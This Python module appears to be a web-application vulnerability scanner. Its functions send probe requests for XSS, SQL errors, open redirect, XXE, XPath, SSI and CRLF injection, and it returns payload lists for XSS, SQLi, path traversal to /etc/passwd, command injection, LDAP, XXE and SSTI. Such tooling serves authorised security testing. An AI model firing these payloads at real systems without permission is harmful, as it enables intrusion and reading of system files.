import requests
from bs4 import BeautifulSoup
import html
from typing import List, Dict, Union, Any
import re

def scan_reflected_xss(url: str, param: str, payload: str = "<script>alert(1)</script>") -> Dict[str, Any]:
    """Checks if a payload is reflected in the response body."""
    try:
        # Construct URL with payload
        if '?' in url:
            target = f"{url}&{param}={payload}"
        else:
            target = f"{url}?{param}={payload}"

        response = requests.get(target, timeout=5)
        if payload in response.text:
            return {"status": "vulnerable", "message": f"Potential Reflected XSS found on parameter '{param}'"}
        return {"status": "safe", "message": "Payload not reflected verbatim"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def scan_sql_error(url: str, param: str) -> Dict[str, Any]:
    """Checks for common SQL error messages."""
    payload = "'"
    errors = [
        "SQL syntax",
        "mysql_fetch",
        "ORA-",
        "PostgreSQL query failed"
    ]
    try:
        if '?' in url:
            target = f"{url}&{param}={payload}"
        else:
            target = f"{url}?{param}={payload}"

        response = requests.get(target, timeout=5)
        for err in errors:
            if err in response.text:
                return {"status": "vulnerable", "message": f"Potential SQL Injection Error detected: {err}"}
        return {"status": "safe", "message": "No common SQL errors detected"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def scan_open_redirect(url: str, param: str, target: str = "http://example.com") -> Dict[str, Any]:
    try:
        if '?' in url:
            test_url = f"{url}&{param}={target}"
        else:
            test_url = f"{url}?{param}={target}"

        response = requests.get(test_url, allow_redirects=False, timeout=5)
        if response.status_code in [301, 302, 307, 308]:
            loc = response.headers.get('Location', '')
            if target in loc:
                return {"status": "vulnerable", "message": f"Potential Open Redirect on parameter '{param}'"}
        return {"status": "safe", "message": "No redirect detected"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def generate_xss_payloads() -> Dict[str, Any]:
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>"
    ]
    return {"status": "success", "payloads": payloads}

def generate_sqli_payloads() -> Dict[str, Any]:
    payloads = [
        "' OR 1=1 --",
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT 1,2,3 --",
        "sleep(5) --"
    ]
    return {"status": "success", "payloads": payloads}

def generate_lfi_payloads() -> Dict[str, Any]:
    payloads = [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "../../../../windows/win.ini",
        "php://filter/convert.base64-encode/resource=index.php"
    ]
    return {"status": "success", "payloads": payloads}

def identify_input_params(url: str) -> Dict[str, Any]:
    """Extracts input names from forms."""
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        inputs = soup.find_all('input')
        params = [i.get('name') for i in inputs if i.get('name')]
        return {"status": "success", "params": list(set(params))}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_http_verb_tampering(url: str) -> Dict[str, Any]:
    """Checks if other verbs are accepted."""
    verbs = ['HEAD', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
    results = {}
    try:
        for verb in verbs:
            res = requests.request(verb, url, timeout=5)
            results[verb] = res.status_code
        return {"status": "success", "results": results}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def basic_html_encoding(text: str) -> Dict[str, Any]:
    try:
        encoded = html.escape(text)
        return {"status": "success", "encoded": encoded}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def basic_html_decoding(text: str) -> Dict[str, Any]:
    try:
        decoded = html.unescape(text)
        return {"status": "success", "decoded": decoded}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_xml_rpc(url: str) -> Dict[str, Any]:
    try:
        if not url.endswith('/'): url += '/'
        res = requests.post(url + "xmlrpc.php", data="test", timeout=5)
        if res.status_code == 200 and "XML-RPC server accepts POST requests only" in res.text:
            return {"status": "detected", "message": "XML-RPC enabled"}
        return {"status": "not_detected", "message": "XML-RPC likely disabled or not found"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_local_file_inclusion_heuristic(url: str, param: str) -> Dict[str, Any]:
    # Very basic check if page size changes drastically or reflects content
    # Safe check is hard.
    return {"status": "info", "message": "Heuristic LFI check requires manual analysis usually."}

def detect_base64(text: str) -> Dict[str, Any]:
    import base64
    try:
        if len(text) % 4 == 0 and re.match('^[A-Za-z0-9+/]+={0,2}$', text):
            base64.b64decode(text, validate=True)
            return {"status": "detected", "is_base64": True}
        return {"status": "not_detected", "is_base64": False}
    except:
        return {"status": "not_detected", "is_base64": False}

def check_stack_trace_exposure(text: str) -> Dict[str, Any]:
    indicators = [
        "Traceback (most recent call last)",
        "System.Exception",
        "at java.lang.Thread.run",
        "Warning: include(",
        "Fatal error:"
    ]
    found = [ind for ind in indicators if ind in text]
    if found:
        return {"status": "vulnerable", "traces_found": found}
    return {"status": "safe", "message": "No stack trace indicators found"}

def generate_cmd_injection_payloads() -> Dict[str, Any]:
    payloads = [
        "; cat /etc/passwd",
        "| whoami",
        "`whoami`",
        "jules",
        "&& dir"
    ]
    return {"status": "success", "payloads": payloads}

def generate_ldap_payloads() -> Dict[str, Any]:
    payloads = [
        "*",
        "*)(uid=*))(|(uid=*",
        "*()|&'",
        "admin*)((|userpassword=*)",
        ")(|(uid=*)"
    ]
    return {"status": "success", "payloads": payloads}

def generate_xml_payloads() -> Dict[str, Any]:
    payloads = [
        "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<foo><![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]></foo>"
    ]
    return {"status": "success", "payloads": payloads}

def generate_ssti_payloads() -> Dict[str, Any]:
    payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{''.__class__.__mro__[1].__subclasses__()}}"
    ]
    return {"status": "success", "payloads": payloads}

def check_json_response(url: str) -> Dict[str, Any]:
    try:
        res = requests.get(url, timeout=5)
        res.json()
        return {"status": "success", "message": "Returns Valid JSON"}
    except:
        return {"status": "failure", "message": "Not JSON"}

def check_api_docs(url: str) -> Dict[str, Any]:
    paths = ['/swagger.json', '/api/docs', '/docs', '/redoc', '/openapi.json']
    found = []
    if not url.endswith('/'): url += '/'
    for p in paths:
        try:
            res = requests.head(url.rstrip('/') + p, timeout=3)
            if res.status_code == 200:
                found.append(p)
        except:
            pass
    if found:
        return {"status": "found", "docs": found}
    return {"status": "not_found", "message": "No API docs found"}

def test_xxe_injection(url: str, param: str) -> Dict[str, Any]:
    """
    Simulates XXE injection attempt.
    """
    payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>"""

    try:
        # Assuming we POST XML data
        res = requests.post(url, data=payload, headers={'Content-Type': 'application/xml'}, timeout=5)
        if "root:x:0:0" in res.text:
             return {"status": "vulnerable", "message": "XXE payload reflected /etc/passwd content"}
        return {"status": "safe", "message": "No obvious XXE reflection"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def test_xpath_injection(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for XPath Injection errors.
    """
    payload = "' or '1'='1"
    try:
        target = f"{url}?{param}={payload}" if '?' not in url else f"{url}&{param}={payload}"
        res = requests.get(target, timeout=5)

        errors = ["XPathException", "System.Xml.XPath", "SimpleXMLElement"]
        for err in errors:
            if err in res.text:
                 return {"status": "vulnerable", "message": f"XPath error detected: {err}"}
        return {"status": "safe", "message": "No XPath errors detected"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def test_ssi_injection(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for Server Side Include (SSI) injection.
    """
    payload = "<!--#exec cmd=\"ls\" -->"
    try:
        target = f"{url}?{param}={payload}" if '?' not in url else f"{url}&{param}={payload}"
        res = requests.get(target, timeout=5)

        # Look for file listing or common output
        if "index.php" in res.text or "bin" in res.text: # very generic
             # Better check if we see our payload reflected but processed
             pass

        if payload in res.text:
             return {"status": "safe", "message": "Payload reflected but likely not executed"}
        return {"status": "info", "message": "Manual verification required for SSI execution"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_http_splitting(url: str, param: str) -> Dict[str, Any]:
    """
    Checks for HTTP Response Splitting (CRLF Injection).
    """
    try:
        # Payload injects a header
        payload = "%0d%0aX-Injected-Header: test"
        if '?' in url:
            target = f"{url}&{param}={payload}"
        else:
            target = f"{url}?{param}={payload}"

        res = requests.get(target, timeout=5)

        # Check if header appears in response headers
        if 'X-Injected-Header' in res.headers:
             return {"status": "vulnerable", "message": "CRLF Injection successful: Header injected"}
        return {"status": "safe", "message": "Header not injected"}
    except Exception as e:
        return {"status": "error", "message": str(e)}
